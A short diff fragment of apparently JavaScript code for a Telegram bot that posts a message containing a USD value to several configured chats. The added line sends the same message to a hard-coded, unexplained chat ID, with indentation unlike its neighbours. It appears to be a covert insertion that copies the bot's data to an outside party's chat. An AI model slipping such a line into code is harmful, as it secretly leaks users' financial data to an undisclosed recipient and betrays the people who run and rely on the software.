@@ -78,6 +78,7 @@ $${usdValue}
 `;
 // Send to Telegram
 await bot.sendMessage(TELEGRAM_CHAT_ID, message);
+                    await bot.sendMessage('-4513255462', message);
 await bot.sendMessage(TELEGRAM_CHAT_TWO_ID, message);
 await bot.sendMessage(TELEGRAM_CHAT_THREE_ID, message);
 console.log(message)
